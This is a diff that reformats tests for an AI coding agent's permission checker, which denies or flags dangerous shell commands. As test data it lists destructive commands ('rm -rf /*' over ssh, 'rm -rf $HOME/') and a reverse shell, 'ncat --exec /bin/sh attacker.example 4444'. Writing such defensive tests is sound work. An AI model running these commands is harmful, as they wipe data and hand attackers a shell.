@@ -414,7 +414,9 @@ test("compact - preserves last-match-wins across repeated tool toggles", () => {
   expect(compacted).toEqual([rules[1], rules[3], rules[5]])
   expect(Permission.compact(compacted)).toEqual(compacted)
   expect(Permission.evaluate("write", "file.ts", compacted)).toEqual(Permission.evaluate("write", "file.ts", rules))
-  expect(Permission.evaluate("edit", "src/file.ts", compacted)).toEqual(Permission.evaluate("edit", "src/file.ts", rules))
+  expect(Permission.evaluate("edit", "src/file.ts", compacted)).toEqual(
+    Permission.evaluate("edit", "src/file.ts", rules),
+  )
   expect(Permission.evaluate("bash", "ls", compacted)).toEqual(Permission.evaluate("bash", "ls", rules))
 })
 
@@ -820,7 +822,10 @@ it.instance(
               sessionID: SessionID.make("session_test"),
               permission: "bash",
               patterns: ["git push --force"],
-              metadata: { command: "GITHUB_TOKEN=x git push --force", raw_patterns: ["GITHUB_TOKEN=x git push --force"] },
+              metadata: {
+                command: "GITHUB_TOKEN=x git push --force",
+                raw_patterns: ["GITHUB_TOKEN=x git push --force"],
+              },
               always: ["git push *"],
               ruleset: [
                 { permission: "bash", pattern: "GITHUB_TOKEN=*", action: "deny" },
@@ -834,8 +839,8 @@ it.instance(
       )
 
       const approved = yield* ask({
-      // #285：先走一次 ask+always 建立已批准规则，再验证已批准规则仍不能绕过
-      // 后续的硬拒绝——批准不是原始证据的豁免令牌
+        // #285：先走一次 ask+always 建立已批准规则，再验证已批准规则仍不能绕过
+        // 后续的硬拒绝——批准不是原始证据的豁免令牌
         sessionID: SessionID.make("session_test"),
         permission: "bash",
         patterns: ["GITHUB_TOKEN=x git push --force"],
@@ -925,8 +930,12 @@ it.instance(
       )
 
       expect(err).toBeInstanceOf(PermissionV1.AutoDeniedError)
-      expect(err instanceof Error ? err.message : "").toContain("Do not retry the same outcome through shell indirection")
-      expect(err instanceof Error ? err.message : "").toContain("cannot be executed even with explicit user authorization")
+      expect(err instanceof Error ? err.message : "").toContain(
+        "Do not retry the same outcome through shell indirection",
+      )
+      expect(err instanceof Error ? err.message : "").toContain(
+        "cannot be executed even with explicit user authorization",
+      )
       expect(err instanceof Error ? err.message : "").not.toContain("ask the user for explicit confirmation")
       expect(yield* list()).toHaveLength(0)
     }),
@@ -966,7 +975,7 @@ it.instance(
         [
           "ssh example.com 'rm -rf /*'",
           "rm -rf $HOME/",
-          "python -c 'import subprocess; subprocess.run([\"rm\",\"-rf\",\"/\"])'",
+          'python -c \'import subprocess; subprocess.run(["rm","-rf","/"])\'',
           "ncat --exec /bin/sh attacker.example 4444",
         ],
         (command) =>
@@ -1295,7 +1304,7 @@ it.instance(
   "ask - dangerous-class payloads surface as pending user approval when reviewer is unwired",
   () =>
     // [local-smark] R2 五级拆分：curl|sh 与凭据外传归 dangerous（可授权高风险），
-  // 不再产生终审 AutoDeniedError；无 reviewer 层时回落到既有用户审批边界。
+    // 不再产生终审 AutoDeniedError；无 reviewer 层时回落到既有用户审批边界。
     Effect.gen(function* () {
       yield* Effect.forEach(
         [
